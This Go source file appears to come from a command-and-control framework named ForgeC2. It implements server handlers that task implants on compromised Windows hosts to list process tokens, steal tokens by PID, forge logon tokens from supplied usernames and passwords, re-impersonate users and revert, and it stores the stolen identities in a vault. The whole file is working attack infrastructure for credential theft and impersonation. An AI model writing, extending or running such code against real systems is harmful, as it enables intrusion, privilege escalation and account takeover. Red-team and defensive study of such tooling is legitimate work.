package server

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
// Token page (per-agent Token Management Center)
// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

func (s *Server) handleTokenPage(c *gin.Context) {
	id := c.Param("id")

	// Tenant scope: the page (and its JSON branch) lists token entries with
	// usernames/domains, so an unscoped read disclosed another tenant's
	// tokens (same class as the shell/screen page IDORs).
	var agent db.Implant
	q := s.tenantScope(s.db.Model(&db.Implant{}), c)
	if err := q.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	// load stored tokens for this agent
	var tokens []db.TokenEntry
	if err := s.db.Where("agent_id = ?", id).Order("created_at desc").Find(&tokens).Error; err != nil {
		slog.Error("Failed to load agent tokens", "err", err)
	}

	// active token (most recent with Active=true)
	var activeToken *db.TokenEntry
	for i := range tokens {
		if tokens[i].Active {
			activeToken = &tokens[i]
			break
		}
	}

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":       "ForgeC2 - Token Management - " + agent.Hostname,
		"Agent":       agent,
		"Tokens":      tokens,
		"ActiveToken": activeToken,
		"ActiveNav":   "agents",
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

// handleGlobalTokensPage shows all tokens across all agents
func (s *Server) handleGlobalTokensPage(c *gin.Context) {
	var tokens []db.TokenEntry
	if err := s.db.Order("created_at desc").Limit(500).Find(&tokens).Error; err != nil {
		slog.Error("Failed to load global tokens", "err", err)
	}

	// build agent map for display
	agentIDs := map[string]bool{}
	for _, t := range tokens {
		agentIDs[t.AgentID] = true
	}
	var agentsInView []db.Implant
	if len(agentIDs) > 0 {
		ids := make([]string, 0, len(agentIDs))
		for id := range agentIDs {
			ids = append(ids, id)
		}
		if err := s.db.Where("id IN ?", ids).Find(&agentsInView).Error; err != nil {
			slog.Error("Failed to query agents for token view", "err", err)
		}
	}
	agentMap := map[string]db.Implant{}
	for _, a := range agentsInView {
		agentMap[a.ID] = a
	}

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":     "ForgeC2 - Token Collection",
		"Tokens":    tokens,
		"AgentMap":  agentMap,
		"ActiveNav": "tokens",
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
// Token Operations (API)
// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

// handleTokenListProcs dispatches token_list_procs task to agent
func (s *Server) handleTokenListProcs(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_list_procs"})
	if task == nil {
		return
	}

	slog.Info("Token list procs requested", "agent_id", id)
	s.dispatchTask(c, task, "token_list_procs", "list process tokens")
}

// handleTokenSteal dispatches token_steal task (steal token from pid)
// POST /agents/:id/token/steal  body: pid=<pid>
func (s *Server) handleTokenSteal(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	pidStr := c.PostForm("pid")
	processName := c.PostForm("process_name") // optional, for display

	if pidStr == "" {
		respondError(c, http.StatusBadRequest, "pid required")
		return
	}
	if _, err := strconv.ParseUint(pidStr, 10, 32); err != nil {
		respondError(c, http.StatusBadRequest, "invalid pid")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_steal", Command: pidStr, Path: processName})
	if task == nil {
		return
	}

	slog.Info("Token steal requested", "agent_id", id, "pid", pidStr)
	s.dispatchTask(c, task, "token_steal", fmt.Sprintf("steal token from pid %s", pidStr))
}

// handleTokenMake dispatches token_make (LogonUser)
// POST /agents/:id/token/make  body: user=DOMAIN\user  password=xxx  logon_type=interactive|network
func (s *Server) handleTokenMake(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	domUser := c.PostForm("user")
	password := c.PostForm("password")
	logonType := c.PostForm("logon_type")

	if domUser == "" {
		respondError(c, http.StatusBadRequest, "user required (format: DOMAIN\\user or user@domain)")
		return
	}
	if logonType == "" {
		logonType = "interactive"
	}

	// Command = user, Shell = password (needed by agent for LogonUser), Path = logon_type
	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_make", Command: domUser, Shell: password, Path: logonType})
	if task == nil {
		return
	}

	slog.Info("Token make requested", "agent_id", id, "user", domUser)
	// The password is deliberately absent from the detail string: dispatchTask
	// fingerprints the arguments for dangerous task types instead.
	s.dispatchTask(c, task, "token_make", fmt.Sprintf("make_token for %s (logon: %s)", domUser, logonType))
}

// handleTokenRevert dispatches rev2self
// POST /agents/:id/token/revert
func (s *Server) handleTokenRevert(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_revert"})
	if task == nil {
		return
	}

	// mark all tokens for this agent as inactive in DB
	if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", id, true).Update("active", false).Error; err != nil {
		slog.Error("Failed to deactivate tokens for revert", "agent_id", id, "err", err)
	}

	slog.Info("Token revert (rev2self) requested", "agent_id", id)
	s.dispatchTask(c, task, "token_revert", "rev2self")
}

// handleTokenWhoami dispatches token_whoami
func (s *Server) handleTokenWhoami(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_whoami"})
	if task == nil {
		return
	}

	s.dispatchTask(c, task, "token_whoami", "")
}

// handleTokenDrop deletes a stored token entry from the vault
// DELETE /agents/:id/token/:token_id
func (s *Server) handleTokenDrop(c *gin.Context) {
	id := c.Param("id")
	tokenIDStr := c.Param("token_id")

	tokenID, err := strconv.ParseUint(tokenIDStr, 10, 64)
	if err != nil {
		respondError(c, http.StatusBadRequest, "invalid token id")
		return
	}

	result := s.db.Where("id = ? AND agent_id = ?", tokenID, id).Delete(&db.TokenEntry{})
	if result.Error != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(result.Error, "delete token"))
		return
	}
	if result.RowsAffected == 0 {
		respondError(c, http.StatusNotFound, "token not found")
		return
	}

	s.LogAuditRecord(c, "token_drop", "agent", id, fmt.Sprintf("dropped token entry %s", tokenIDStr), true, nil)
	respond(c, gin.H{})
}

// handleTokenImpersonate re-activates a saved token (re-steal from same pid)
// POST /agents/:id/token/:token_id/impersonate
func (s *Server) handleTokenImpersonate(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	tokenIDStr := c.Param("token_id")

	tokenID, err := strconv.ParseUint(tokenIDStr, 10, 64)
	if err != nil {
		respondError(c, http.StatusBadRequest, "invalid token id")
		return
	}

	var entry db.TokenEntry
	if err := s.db.First(&entry, tokenID).Error; err != nil {
		respondError(c, http.StatusNotFound, "token entry not found")
		return
	}
	if entry.AgentID != id {
		respondError(c, http.StatusForbidden, "token does not belong to this agent")
		return
	}

	// Re-steal the same pid
	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_steal", Command: fmt.Sprintf("%d", entry.PID), Path: entry.ProcessName})
	if task == nil {
		return
	}

	slog.Info("Token re-impersonate requested", "agent_id", id, "pid", entry.PID, "user", entry.Username)
	s.dispatchTask(c, task, "token_impersonate", fmt.Sprintf("re-impersonate %s\\%s (pid %d)", entry.Domain, entry.Username, entry.PID))
}

// handleGetTokens returns JSON list of tokens for an agent (used by AJAX)
func (s *Server) handleGetTokens(c *gin.Context) {
	id := c.Param("id")
	var tokens []db.TokenEntry
	if err := s.db.Where("agent_id = ?", id).Order("created_at desc").Find(&tokens).Error; err != nil {
		// An empty 200 here reads as "this agent has no tokens": a failed
		// read must be a 500, not a false bill of health.
		handleQueryError(c, err, "Failed to get tokens")
		return
	}
	respond(c, tokens)
}

// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
// processTokenResult is called from handlers_beacon.go when a
// token task result arrives from the agent.
// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

// processTokenResult parses token task results and persists them to the vault.
func (s *Server) processTokenResult(agentID string, taskType string, output string) {
	switch taskType {
	case "token_steal":
		// output: JSON {"domain":"X","username":"Y","integrity":"Z","pid":"NNN","whoami":"..."}
		var m map[string]string
		if err := json.Unmarshal([]byte(output), &m); err != nil {
			slog.Warn("processTokenResult: could not parse token_steal output", "err", err)
			return
		}
		pid64, _ := strconv.ParseUint(m["pid"], 10, 32)

		// Deactivate any previous active tokens for this agent
		if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false).Error; err != nil {
			slog.Error("Failed to deactivate previous tokens", "agent_id", agentID, "err", err)
		}

		entry := db.TokenEntry{
			AgentID:   agentID,
			PID:       uint32(pid64),
			Domain:    m["domain"],
			Username:  m["username"],
			Integrity: m["integrity"],
			Source:    "steal",
			TokenType: "Impersonation",
			Active:    true,
			CreatedAt: time.Now(),
		}
		if err := s.db.Create(&entry).Error; err != nil {
			slog.Error("Failed to save stolen token", "agent_id", agentID, "err", err)
			return
		}
		slog.Info("Token stolen and saved", "agent_id", agentID, "user", m["domain"]+"\\"+m["username"])

	case "token_make":
		var m map[string]string
		if err := json.Unmarshal([]byte(output), &m); err != nil {
			slog.Warn("processTokenResult: could not parse token_make output", "err", err)
			return
		}

		if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false).Error; err != nil {
			slog.Error("Failed to deactivate tokens before make", "agent_id", agentID, "err", err)
		}

		entry := db.TokenEntry{
			AgentID:   agentID,
			PID:       0,
			Domain:    m["domain"],
			Username:  m["username"],
			Integrity: m["integrity"],
			LogonType: m["logon_type"],
			Source:    "make_token",
			TokenType: "Primary",
			Active:    true,
			CreatedAt: time.Now(),
		}
		if err := s.db.Create(&entry).Error; err != nil {
			slog.Error("Failed to save made token", "agent_id", agentID, "err", err)
			return
		}
		slog.Info("Token made and saved", "agent_id", agentID, "user", m["domain"]+"\\"+m["username"])

	case "token_revert", "rev2self":
		// mark all inactive
		if err := s.db.Model(&db.TokenEntry{}).Where("agent_id = ? AND active = ?", agentID, true).Update("active", false).Error; err != nil {
			slog.Error("Failed to deactivate tokens on revert", "agent_id", agentID, "err", err)
		}
	}
}

// handleTokenNoteUpdate updates notes on a token entry
// POST /agents/:id/token/:token_id/note
func (s *Server) handleTokenNoteUpdate(c *gin.Context) {
	id := c.Param("id")
	tokenIDStr := c.Param("token_id")
	notes := c.PostForm("notes")

	tokenID, err := strconv.ParseUint(tokenIDStr, 10, 64)
	if err != nil {
		respondError(c, http.StatusBadRequest, "invalid token id")
		return
	}

	// Tenant gate first: without it a caller from another tenant could probe
	// token ids and read the 200-vs-404 difference.
	if s.resolveVisibleAgentID(c, id) == "" {
		respondError(c, http.StatusNotFound, "agent not found")
		return
	}

	result := s.db.Model(&db.TokenEntry{}).Where("id = ? AND agent_id = ?", tokenID, id).Update("notes", notes)
	if result.Error != nil {
		respondError(c, http.StatusInternalServerError, sanitizeError(result.Error, "update token notes"))
		return
	}
	// Reporting success for a token that does not exist (or belongs to another
	// tenant) is a lie the operator triages from.
	if result.RowsAffected == 0 {
		respondError(c, http.StatusNotFound, "token not found")
		return
	}
	respond(c, gin.H{})
}

// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
// tokenListProcsResult parses the base64-encoded JSON from
// a token_list_procs result and returns nicely formatted text.
// (Used by handleBeaconResult in handlers_beacon.go)
// 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€

// FormatTokenProcsResult decodes base64 and formats a token_list_procs result for display.
// FormatTokenProcsFromJSON formats an already-decoded JSON token_list_procs result.
func FormatTokenProcsFromJSON(jsonStr string) string {
	type procInfo struct {
		PID         uint32 `json:"PID"`
		ProcessName string `json:"ProcessName"`
		Domain      string `json:"Domain"`
		Username    string `json:"Username"`
		Integrity   string `json:"Integrity"`
		TokenType   string `json:"TokenType"`
		Error       string `json:"Error"`
	}
	var procs []procInfo
	if err := json.Unmarshal([]byte(jsonStr), &procs); err != nil {
		return jsonStr // return raw if not valid JSON
	}
	if len(procs) == 0 {
		return "(no processes with notable tokens found)"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-8s  %-22s  %-30s  %-10s\n", "PID", "Process", "User", "Integrity"))
	sb.WriteString(strings.Repeat("鈹€", 80) + "\n")
	for _, p := range procs {
		user := p.Domain + "\\" + p.Username
		if p.Error != "" {
			user = "(" + p.Error + ")"
		}
		sb.WriteString(fmt.Sprintf("%-8d  %-22s  %-30s  %-10s\n",
			p.PID, p.ProcessName, user, p.Integrity))
	}
	return sb.String()
}
